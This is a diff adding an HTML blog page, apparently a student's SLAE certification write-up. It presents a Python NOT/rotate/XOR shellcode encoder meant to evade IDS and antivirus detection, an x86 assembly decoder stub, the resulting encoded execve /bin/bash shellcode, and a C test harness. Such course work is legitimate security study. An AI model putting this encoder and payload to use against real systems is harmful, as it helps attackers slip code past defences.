@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=ff3500eed5a75a68d749d7b17422f0859d1af87a">
+
+<!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>Assignment 4 | SLAE-x86</title>
+<meta name="generator" content="Jekyll v3.8.5" />
+<meta property="og:title" content="Assignment 4" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="x86 Assembly Language and Shellcoding on Linux" />
+<meta property="og:description" content="x86 Assembly Language and Shellcoding on Linux" />
+<link rel="canonical" href="http://localhost:4000/03_encoder/" />
+<meta property="og:url" content="http://localhost:4000/03_encoder/" />
+<meta property="og:site_name" content="SLAE-x86" />
+<script type="application/ld+json">
+{"url":"http://localhost:4000/03_encoder/","headline":"Assignment 4","description":"x86 Assembly Language and Shellcoding on Linux","@type":"WebPage","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <h1>SLAE-x86</h1>
+        <h2>x86 Assembly Language and Shellcoding on Linux</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/parzio/SLAE-x86" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="assignment-4">Assignment 4</h1>
+
+<ul>
+  <li>Create a custom encoding scheme like the “Insertion Encoder” we showed you</li>
+  <li>PoC with using the execve-stack as the shellcode to encode with your schema and execute</li>
+</ul>
+
+<h2 id="execution">Execution</h2>
+
+<p>Even if null bytes or other kind of bad chars have been removed from the shellcode, its execution, in several scenarios, might be prevented due to IPS/IDS or antivirus. Thus, it comes the need to encode the shellcode with the goal of minimizing the surface fingerprintable. An encoder happens in two phase:</p>
+
+<ol>
+  <li>Encoding the shellcode using a schema defined. This can be done using any programming language;</li>
+  <li>Assembly routine that decodes the shellcode.</li>
+</ol>
+
+<p>Let’s dive into these two stages.</p>
+
+<p>Firstly, I decided to use the following encoding schema:</p>
+
+<ul>
+  <li>Execute a NOT on each shellcode byte;</li>
+  <li>Execute a right bit ROTATE by a predefined number on each shellcode byte;</li>
+  <li>Execute a XOR with a predefined byte on each shellcode byte.</li>
+</ul>
+
+<p>Obviously, all these operations are invertible. Below, my implementation in Python using the <em>execve</em> payload.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
+
+<span class="c"># Author  : Alessio Parzian</span>
+<span class="c"># Filename: ShellEncoder.py</span>
+<span class="c"># Usage   : python ShellEncoder.py</span>
+
+<span class="c"># This script is an helper to encode any shellcode using a custom encoder</span>
+
+<span class="c"># Exec bin/sh shellcode</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xeb\x1a\x5e\x31\xdb\x88\x5e\x09\x89\x76\x0a\x89\x5e\x0e\x8d\x1e\x8d\x4e\x0a\x8d\x56\x0e\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43</span><span class="s">"</span><span class="p">;</span>
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+
+<span class="n">xor_fixed</span> <span class="o">=</span> <span class="mh">0xbb</span> 
+<span class="n">shift_fixed</span> <span class="o">=</span> <span class="mh">0x02</span>
+
+<span class="c"># This custom encoder makes use of three techniques in a chain</span>
+<span class="c">#	NOT encoding</span>
+<span class="c">#	ROTATE encoding</span>
+<span class="c">#	XOR encoding</span>
+
+<span class="k">for</span> <span class="n">idx</span><span class="p">,</span><span class="n">opcode</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">shellcode</span><span class="p">):</span>
+	<span class="c"># Apply NOT encoding</span>
+	<span class="n">opcode</span> <span class="o">=</span> <span class="o">~</span><span class="n">opcode</span>
+	<span class="n">opcode</span> <span class="o">=</span> <span class="n">opcode</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="c"># Mask the result with the goal of preserving only the byte modified</span>
+	<span class="c"># Apply Rotation right</span>
+	<span class="n">opcode_shifted</span> <span class="o">=</span> <span class="n">opcode</span> <span class="o">&gt;&gt;</span> <span class="n">shift_fixed</span>
+	<span class="n">opcode_rotl</span> <span class="o">=</span> <span class="p">(</span><span class="n">opcode</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">shift_fixed</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xff</span> 
+	<span class="n">opcode</span> <span class="o">=</span> <span class="n">opcode_shifted</span> <span class="o">|</span> <span class="n">opcode_rotl</span>
+	<span class="c"># Apply fixed xor</span>
+	<span class="n">opcode</span> <span class="o">=</span> <span class="p">(</span><span class="n">opcode</span> <span class="o">^</span> <span class="n">xor_fixed</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
+	<span class="c"># Save encoded opcode</span>
+	<span class="n">shellcode</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">opcode</span>
+
+<span class="k">print</span> <span class="s">'==========================='</span>
+<span class="k">print</span> <span class="s">'NOT + ROTATE + XOR'</span>
+<span class="k">print</span> <span class="s">'Shellcode length: {0}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+<span class="k">print</span> <span class="s">'==========================='</span>
+<span class="n">shellcode_final</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">shellcode_final_array</span> <span class="o">=</span> <span class="s">""</span>
+<span class="k">for</span> <span class="n">opcode</span> <span class="ow">in</span> <span class="n">shellcode</span><span class="p">:</span>
+	<span class="n">shellcode_final</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\\</span><span class="s">x"</span><span class="o">+</span><span class="s">"{:02x}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">opcode</span><span class="p">)</span>
+	<span class="n">shellcode_final_array</span> <span class="o">+=</span> <span class="s">"0x"</span><span class="o">+</span><span class="s">"{:02x}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">opcode</span><span class="p">)</span><span class="o">+</span><span class="s">","</span>
+<span class="n">shellcode_final_array</span> <span class="o">=</span> <span class="n">shellcode_final_array</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="k">print</span> <span class="n">shellcode_final</span>
+<span class="k">print</span> <span class="n">shellcode_final_array</span>
+<span class="k">print</span> <span class="s">'==========================='</span>
+</code></pre></div></div>
+
+<p>The output of the above script is the following:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>===========================
+NOT + ROTATE + XOR
+Shellcode length: 51
+===========================
+\xbe\xc2\xd3\x08\xb2\x66\xd3\x06\x26\xd9\xc6\x26\xd3\xc7\x27\xc3\x27\xd7\xc6\x27\xd1\xc7\x08\x74\x68\x86\x37\x64\x7e\x3c\xbb\xbb\xbb\x8f\xdc\x1e\xdf\x8f\xdc\x1c\x98\x5e\x14\xd4\xd4\xd4\xd4\x94\x94\x94\x94
+0xbe,0xc2,0xd3,0x08,0xb2,0x66,0xd3,0x06,0x26,0xd9,0xc6,0x26,0xd3,0xc7,0x27,0xc3,0x27,0xd7,0xc6,0x27,0xd1,0xc7,0x08,0x74,0x68,0x86,0x37,0x64,0x7e,0x3c,0xbb,0xbb,0xbb,0x8f,0xdc,0x1e,0xdf,0x8f,0xdc,0x1c,0x98,0x5e,0x14,0xd4,0xd4,0xd4,0xd4,0x94,0x94,0x94,0x94
+===========================
+</code></pre></div></div>
+
+<p>No null bytes present, great! Be sure, in case you change payload that no null bytes are there. In case there are, change the variable <em>xor_fixed</em> with a different byte or change the rotation value in the variable <em>shift_fixed</em>. Change the related decoding routing accordingly.</p>
+
+<p>Now, let’s move to the second part, the decoding routine in Assembly! The encoded shell has to be placed in the EncodedShell label.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>; Author :  Alessio Parzian
+; Filename: shell_encoded.asm
+
+; compile with:
+; 	nasm -f elf32 shellcode_encoded.asm
+;	ld -o shellcode_encoded shellcode_encoded.o
+; extract shellcode with:
+; 	objdump -d shellcode_encoded | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/^/\\x/g' | perl -pe 's/\r?\n//' | sed 's/$/\n/'
+
+global _start
+
+section .text
+
+	_start:
+		jmp short call_shellcode
+	
+	decoder:
+		pop esi
+		xor ebx, ebx
+		xor ecx, ecx
+		xor edx, edx
+		mov cl, 0x32 ; change the value based on the length of the encoded shellcode 
+	
+	decode:
+		mov bl, byte [esi]
+		xor bl, 0xbb
+		and bl, 0xff
+		mov dl, byte [esi]
+		xor dl, 0xbb
+		and dl, 0xff
+		rol bl, 0x02
+		and bl, 0xff
+		ror dl, 0x06
+		and bl, dl
+		not bl
+		mov byte [esi], bl
+		inc esi
+		loop decode
+		; call the decoded shell
+		jmp short EncodedShell
+
+	call_shellcode:
+		call decoder
+		EncodedShell: db 0xbe,0xc2,0xd3,0x08,0xb2,0x66,0xd3,0x06,0x26,0xd9,0xc6,0x26,0xd3,0xc7,0x27,0xc3,0x27,0xd7,0xc6,0x27,0xd1,0xc7,0x08,0x74,0x68,0x86,0x37,0x64,0x7e,0x3c,0xbb,0xbb,0xbb,0x8f,0xdc,0x1e,0xdf,0x8f,0xdc,0x1c,0x98,0x5e,0x14,0xd4,0xd4,0xd4,0xd4,0x94,0x94,0x94,0x94
+
+</code></pre></div></div>
+
+<p>The decoding phase simply executes the inverse operations of the encoding schema. The JMP/CALL/POP technique has been used to gather the address of the encoded shellcode.
+Once compiled the shellcode is the following.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\xeb\x2d\x5e\x31\xdb\x31\xc9\x31\xd2\xb1\x32\x8a\x1e\x80\xf3\xbb\x80\xe3\xff\x8a\x16\x80\xf2\xbb\x80\xe2\xff\xc0\xc3\x02\x80\xe3\xff\xc0\xca\x06\x20\xd3\xf6\xd3\x88\x1e\x46\xe2\xde\xeb\x05\xe8\xce\xff\xff\xff\xbe\xc2\xd3\x08\xb2\x66\xd3\x06\x26\xd9\xc6\x26\xd3\xc7\x27\xc3\x27\xd7\xc6\x27\xd1\xc7\x08\x74\x68\x86\x37\x64\x7e\x3c\xbb\xbb\xbb\x8f\xdc\x1e\xdf\x8f\xdc\x1c\x98\x5e\x14\xd4\xd4\xd4\xd4\x94\x94\x94\x94
+</code></pre></div></div>
+
+<p>The resulting shellcode does not contains null bytes, great! But, note that the size is doubled, from 51 bytes to 103 bytes. In case you need a smaller size, an operation of the encoding schema might be taken away.</p>
+
+<p>For testing the shellcode generated the following helper program was used.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+// Author: Alessio Parzian
+// Filename: test_shell.c
+//
+// Test your shellcode. Replace shellcode variable value with your own shell, compile and execute.
+// Compile with:
+// 	gcc $file_name -fno-stack-protector -z execstack -o $out_name
+*/</span>
+
+<span class="cp">#include &lt;stdio.h&gt;
+</span>
+<span class="c1">// Use an array instead of a pointer because compiler does consider the array as mutable (this implies you can modify it at runtime). For pointers to literal this is not the case unless specific flag is passed to the compiler. This is very important when modifing at runtime the shellcode.
+</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xeb\x2d\x5e\x31\xdb\x31\xc9\x31\xd2\xb1\x32\x8a\x1e\x80\xf3\xbb\x80\xe3\xff\x8a\x16\x80\xf2\xbb\x80\xe2\xff\xc0\xc3\x02\x80\xe3\xff\xc0\xca\x06\x20\xd3\xf6\xd3\x88\x1e\x46\xe2\xde\xeb\x05\xe8\xce\xff\xff\xff\xbe\xc2\xd3\x08\xb2\x66\xd3\x06\x26\xd9\xc6\x26\xd3\xc7\x27\xc3\x27\xd7\xc6\x27\xd1\xc7\x08\x74\x68\x86\x37\x64\x7e\x3c\xbb\xbb\xbb\x8f\xdc\x1e\xdf\x8f\xdc\x1c\x98\x5e\x14\xd4\xd4\xd4\xd4\x94\x94\x94\x94</span><span class="s">"</span><span class="p">;</span>
+
+<span class="kt">int</span> <span class="n">main</span> <span class="p">(){</span>
+	<span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">shell</span><span class="p">)(</span><span class="kt">void</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span> <span class="n">shellcode</span><span class="p">;</span>
+	<span class="n">shell</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Well, this concludes assignment 4!</p>
+
+<p><br /></p>
+
+<hr />
+<hr />
+
+<p><em>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.</em></p>
+
+<p><a href="http://securitytube-training.com/online-courses/security-tube-linux-assembly-expert">http://securitytube-training.com/online-courses/security-tube-linux-assembly-expert</a></p>
+
+<p><em>Student-ID: PA-8733</em></p>
+
+      </section>
+    </div>
+
+    
+  </body>
+</html>
